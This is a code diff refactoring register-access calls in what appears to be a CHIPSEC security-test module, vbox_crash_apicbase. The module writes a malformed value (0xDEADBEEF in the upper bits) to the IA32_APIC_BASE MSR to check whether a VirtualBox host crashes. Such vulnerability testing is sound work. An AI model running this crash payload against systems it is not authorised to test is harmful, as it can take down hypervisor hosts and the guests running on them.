@@ -40,11 +40,11 @@ class vbox_crash_apicbase (BaseModule):
         tid = 0
         #(eax, edx) = self.cs.msr.read_msr( tid, 0x1B )
         #self.cs.msr.write_msr( tid, 0x1B, eax, 0xDEADBEEF )
-        apicbase_msr = chipsec.chipset.read_register( self.cs, 'IA32_APIC_BASE', tid )
-        chipsec.chipset.print_register( self.cs, 'IA32_APIC_BASE', apicbase_msr )
+        apicbase_msr = self.cs.read_register( 'IA32_APIC_BASE', tid )
+        self.cs.print_register( 'IA32_APIC_BASE', apicbase_msr )
         apicbase_msr = 0xDEADBEEF00000000 | (apicbase_msr & 0xFFFFFFFF)
         self.logger.log( "[*] writing 0x%016X to IA32_APIC_BASE MSR.." % apicbase_msr )
-        chipsec.chipset.write_register( self.cs, 'IA32_APIC_BASE', apicbase_msr, tid )
+        self.cs.write_register( 'IA32_APIC_BASE', apicbase_msr, tid )
 
         # If we are here, then we are fine ;)
         self.logger.log_passed_check( "VMM/Host OS didn't crash (not vulnerable)" )
